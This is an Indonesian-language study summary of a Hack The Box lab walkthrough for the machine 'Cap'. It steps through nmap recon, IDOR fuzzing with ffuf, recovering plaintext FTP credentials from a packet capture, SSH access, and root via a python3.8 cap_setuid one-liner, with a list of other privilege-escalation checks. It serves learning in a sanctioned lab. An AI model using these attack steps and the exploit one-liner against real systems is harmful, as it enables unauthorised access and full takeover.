# Resume Materi — HTB Machine: Cap
### [20 Apr 2026]

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 ALUR ATTACK — CAP (Easy Linux)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Recon → Web Enum → IDOR → PCAP Analysis → Foothold → Privesc → Root

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 PHASE 1 — RECON
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Tujuan   : Kenali target, temukan attack surface
Tools    : ping, nmap

ping -c 4 [IP]
  → Cek apakah host hidup & responsif

nmap -sV -sC -T4 [IP]
  Switches :
  -sV  = deteksi versi service yang berjalan
  -sC  = jalankan default scripts (enumerate lebih dalam)
  -T4  = kecepatan scan (T1 paling lambat, T5 paling cepat)

Hasil Cap :
  21/tcp → FTP  (vsftpd 3.0.3)
  22/tcp → SSH  (OpenSSH 8.2p1)
  80/tcp → HTTP (Gunicorn — Security Dashboard)

Prioritas : HTTP dulu → tidak perlu credentials, attack surface luas

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 PHASE 2 — WEB ENUMERATION & IDOR
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Apa itu IDOR :
  Insecure Direct Object Reference
  Server tidak validasi KEPEMILIKAN data, hanya validasi request valid/tidak
  Celah : user bisa akses data milik orang lain hanya dengan ganti parameter URL

Contoh Cap :
  /data/1  → data capture milik user sendiri
  /data/0  → data capture orang lain (HARUSNYA tidak bisa diakses!)
  Server tidak cek "ini data milik kamu?" → IDOR!

Kenapa susah dideteksi :
  Request kelihatan normal & legitimate dari sisi server
  Tidak ada "serangan" yang bisa di-alert sistem

Tools fuzzing URL (otomatis coba banyak nilai) :
  ffuf -u http://[IP]/data/FUZZ -w [wordlist] -mc 200
  Switches :
  -u    = URL target (FUZZ = bagian yang diganti otomatis)
  -w    = wordlist yang dipakai
  -mc   = filter response code (200 = berhasil)

Buat wordlist angka sendiri :
  seq 0 20 > /tmp/numbers.txt

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 PHASE 3 — PCAP ANALYSIS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Apa itu PCAP : File rekaman traffic jaringan (packet capture)
Tool         : Wireshark

Filter Wireshark :
  ftp          → tampilkan semua FTP control traffic
  ftp-data     → tampilkan isi data yang ditransfer via FTP
  http         → filter traffic HTTP
  tcp.port==21 → alternatif filter by port

Kenapa FTP berbahaya :
  FTP = PLAINTEXT, tidak terenkripsi
  Semua data (termasuk USERNAME & PASSWORD) terlihat jelas di PCAP
  Bandingkan : SSH = terenkripsi, tidak bisa dibaca di PCAP

Yang dicari di PCAP :
  Packet dengan label USER → berisi username
  Packet dengan label PASS → berisi password plaintext

Hasil Cap :
  USER : nathan
  PASS : Buck3tH4TF0RM3!

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 PHASE 4 — FOOTHOLD via SSH
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Kenapa SSH bukan FTP :
  FTP  = terbatas, hanya upload/download file, tidak bisa jalankan perintah
  SSH  = full shell access, bisa navigasi & jalankan command bebas

Command :
  ssh [user]@[IP]
  Contoh : ssh nathan@10.129.30.147

Setelah masuk :
  ls && cat user.txt  → ambil user flag
  Flag ada di : /home/[username]/user.txt

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 PHASE 5 — PRIVILEGE ESCALATION
         via Linux Capabilities
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Apa itu Linux Capabilities :
  Root punya semua kekuatan → capabilities memecah kekuatan root
  jadi potongan kecil yang bisa dikasih ke binary tertentu
  Lebih granular dari sudo

Perbandingan :
  SUID         = binary jalan dengan SEMUA kekuatan root (berbahaya)
  Capabilities = binary hanya dapat kekuatan SPESIFIK (lebih terbatas)
  Sudo         = user boleh jalankan perintah tertentu sebagai root

Capabilities berbahaya :
  cap_setuid  → bisa ganti UID jadi siapapun (termasuk root/UID 0)
  cap_net_raw → bisa buat raw network packet

Enumerate capabilities :
  getcap -r / 2>/dev/null
  Switches :
  -r          = recursive, cari dari / ke seluruh filesystem
  2>/dev/null = buang error message, output lebih bersih

Hasil Cap :
  /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
  → Python3.8 bisa ganti UID! → CELAH!

Exploit :
  python3.8 -c "import os; os.setuid(0); os.system('/bin/bash')"
  Breakdown :
  import os       = load library interaksi OS
  os.setuid(0)    = ganti UID jadi 0 (root)
  os.system(...)  = spawn bash shell sebagai root

Setelah root :
  whoami          → pastikan sudah root
  pwd             → cek posisi directory
  cd /root        → pindah ke home root
  cat /root/root.txt → ambil root flag

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 VEKTOR PRIVESC LAIN (kalau cap gagal)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. Sudo misconfiguration
   sudo -l
   → Lihat command apa yang bisa dijalanin sebagai root

2. SUID binaries
   find / -perm -4000 2>/dev/null
   → Cari binary yang jalan sebagai owner (root)

3. Cron jobs
   cat /etc/crontab
   → Ada script milik root yang berjalan terjadwal?

4. Writable files
   find / -writable 2>/dev/null
   → Ada file milik root yang bisa diedit?

5. Kernel exploit → cara terakhir

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 KONVENSI HTB (WAJIB HAPAL)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
User flag → /home/[username]/user.txt
Root flag → /root/root.txt

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 ISTILAH PENTING
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
IDOR         = Insecure Direct Object Reference
               akses data orang lain via manipulasi parameter
PCAP         = Packet Capture, rekaman traffic jaringan
Foothold     = akses awal yang berhasil ke sistem target
Capabilities = potongan kekuatan root yang dikasih ke binary tertentu
SUID         = binary yang jalan dengan privilege pemiliknya (root)
Fuzzing      = otomatis coba banyak nilai ke target (URL, parameter, dll)
Plaintext    = data tidak terenkripsi, bisa dibaca langsung
Attack Surface = semua titik/celah yang bisa diserang di suatu sistem
Privesc      = Privilege Escalation, naikkan akses dari user → root
```